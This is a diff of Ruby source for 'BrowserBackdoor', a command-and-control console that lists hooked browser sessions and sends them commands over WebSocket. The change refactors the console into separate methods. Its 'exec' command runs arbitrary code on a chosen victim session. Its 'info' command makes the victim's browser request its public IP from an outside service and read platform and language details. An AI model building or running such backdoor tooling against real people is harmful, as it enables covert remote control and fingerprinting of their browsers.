@@ -34,6 +34,25 @@ require 'yaml'
 # TODO: Make all the variables besides $wsList non global.
 $wsList = Array.new
 $selected = -1
+COMMANDS = {
+    "help" => "Help menu",
+    "exit" => "Quit the application",
+    "sessions" => "List active sessions",
+    "use" => "Select active session",
+    "info" => "Get session information (IP, User Agent)",
+    "exec" => "Execute a command on a session",
+    "get_cert" => "Get a free TLS certificate from LetsEncrypt",
+    "load" => "Load a module (not implemented yet)"
+}
+WELCOME_MESSAGE = ""\
+" ____                                  ____             _       _                  \n"\
+"|  _ \                                |  _ \           | |     | |                 \n"\
+"| |_) |_ __ _____      _____  ___ _ __| |_) | __ _  ___| | ____| | ___   ___  _ __ \n"\
+"|  _ <| '__/ _ \ \ /\ / / __|/ _ \ '__|  _ < / _' |/ __| |/ / _' |/ _ \ / _ \| '__|\n"\
+"| |_) | | | (_) \ V  V /\__ \  __/ |  | |_) | (_| | (__|   < (_| | (_) | (_) | |   \n"\
+"|____/|_|  \___/ \_/\_/ |___/\___|_|  |____/ \__,_|\___|_|\_\__,_|\___/ \___/|_| by IMcPwn\n"\
+"Visit http://imcpwn.com for more information.\n"
+
 def main()
     begin
         configfile = YAML.load_file("config.yml")
@@ -55,25 +74,66 @@ def print_notice(message)
     puts "[*] " + message
 end
 
-COMMANDS = {
-    "help" => "Help menu",
-    "exit" => "Quit the application",
-    "sessions" => "List active sessions",
-    "use" => "Select active session",
-    "info" => "Get session information (IP, User Agent)",
-    "exec" => "Execute a command on a session",
-    "get_cert" => "Get a free TLS certificate from LetsEncrypt",
-    "load" => "Load a module (not implemented"
-}
+def infoCommand()
+    # TODO: Improve method of getting IP address
+    infoCommands = ["var xhttp = new XMLHttpRequest();xhttp.open(\"GET\", \"https://ipv4.icanhazip.com/\", false);xhttp.send();xhttp.responseText","navigator.appVersion;", "navigator.platform;", "navigator.language;"]
+    infoCommands.each {|cmd|
+        begin
+            sendCommand(cmd, $wsList[$selected])
+        rescue
+             print_error("Error sending command. Selected session may no longer exist.")
+             return
+        end
+    }
+end
 
-WELCOME_MESSAGE = ""\
-" ____                                  ____             _       _                  \n"\
-"|  _ \                                |  _ \           | |     | |                 \n"\
-"| |_) |_ __ _____      _____  ___ _ __| |_) | __ _  ___| | ____| | ___   ___  _ __ \n"\
-"|  _ <| '__/ _ \ \ /\ / / __|/ _ \ '__|  _ < / _' |/ __| |/ / _' |/ _ \ / _ \| '__|\n"\
-"| |_) | | | (_) \ V  V /\__ \  __/ |  | |_) | (_| | (__|   < (_| | (_) | (_) | |   \n"\
-"|____/|_|  \___/ \_/\_/ |___/\___|_|  |____/ \__,_|\___|_|\_\__,_|\___/ \___/|_| by IMcPwn\n"\
-"Visit http://imcpwn.com for more information.\n"
+def sessionsCommand()
+    if $wsList.length < 1
+        puts "No sessions"
+        return
+    end
+    puts "ID: Connection"
+    $wsList.each_with_index {|val, index|
+        puts index.to_s + " : " + val.to_s
+    }
+end
+
+def execCommand(cmdIn)
+    if cmdIn.length < 2
+        loop do
+            print "Enter the command to send. (exit when done)\nCMD-#{$selected}> "
+            cmdSend = gets.split.join(' ')
+            break if cmdSend == "exit"
+            next if cmdSend == ""
+            begin
+                sendCommand(cmdSend, $wsList[$selected])
+            rescue
+                print_error("Error sending command. Selected session may no longer exist.")
+            end
+        end
+    else
+        # TODO: Support space
+        begin
+            sendCommand(cmdIn[1], $wsList[$selected])
+        rescue
+            print_error("Error sending command. Selected session may no longer exist.")
+        end
+    end
+end
+
+def useCommand(cmdIn)
+    if cmdIn.length < 2
+        print_error("Invalid usage. Try help for help.")
+        return
+     end
+     selectIn = cmdIn[1].to_i
+     if selectIn > $wsList.length - 1
+         print_error("Session does not exist.")
+         return
+     end
+     $selected = selectIn
+     print_notice("Selected session is now " + $selected.to_s + ".")
+end
 
 def cmdLine()
     puts WELCOME_MESSAGE
@@ -91,65 +151,21 @@ def cmdLine()
         when "exit"
             break
         when "sessions"
-            if $wsList.length < 1 
-                puts "No sessions"
-                next
-            end
-            puts "ID: Connection"
-            $wsList.each_with_index {|val, index|
-                puts index.to_s + " : " + val.to_s
-            }
+            sessionsCommand()        
         when "use"
-            if cmdIn.length < 2
-                print_error("Invalid usage. Try help for help.")
-                next
-            end
-            selectIn = cmdIn[1].to_i
-            if selectIn > $wsList.length - 1
-                print_error("Session does not exist.")
-                next
-            end
-            $selected = selectIn
-            print_notice("Selected session is now " + $selected.to_s + ".")
+            useCommand(cmdIn)
         when "info"
-            if $selected == -1 # || TODO: Check if session no longer exists
-                print_error("No session selected. Try use SESSION_ID first.")
-                next
-            end
-            # TODO: Improve method of getting IP address
-            infoCommands = ["var xhttp = new XMLHttpRequest();xhttp.open(\"GET\", \"https://ipv4.icanhazip.com/\", false);xhttp.send();xhttp.responseText","navigator.appVersion;", "navigator.platform;", "navigator.language;"]
-            infoCommands.each {|cmd|
-                begin
-                    sendCommand(cmd, $wsList[$selected])
-                rescue
-                    print_error("Error sending command. Selected session may no longer exist.")
-                end
-            }
-        when "exec"
-            if $selected == -1 # || TODO: Check if session no longer exists
-                print_error("No session selected. Try use SESSION_ID first.")
-                next
-            end
-            if cmdIn.length < 2
-                loop do
-                    print "Enter the command to send. (exit when done)\nCMD-#{$selected}> "
-                    cmdSend = gets.split.join(' ')
-                    break if cmdSend == "exit"
-                    next if cmdSend == ""
-                    begin
-                        sendCommand(cmdSend, $wsList[$selected])
-                    rescue
-                        print_error("Error sending command. Selected session may no longer exist.")
-                    end
-                end
+            if validSession?($selected)
+                infoCommand()
             else
-                # TODO: Support space
-                begin
-                    sendCommand(cmdIn[1], $wsList[$selected])
-                rescue
-                    print_error("Error sending command. Selected session may no longer exist.")
-                end
+                next
             end
+        when "exec"
+           if validSession?($selected)
+               execCommand(cmdIn)
+           else
+               next
+           end
        when "get_cert"
            if File.file?("getCert.sh")
                system("./getCert.sh")
@@ -160,6 +176,14 @@ def cmdLine()
            print_error("Invalid command. Try help for help.")
         end
     end
+end
+
+def validSession?(selected)
+    if selected == -1 # || TODO: Check if session no longer exists
+        print_error("No session selected. Try use SESSION_ID first.")
+        return false
+    end
+    return true
 end
 
 def sendCommand(cmd, ws)
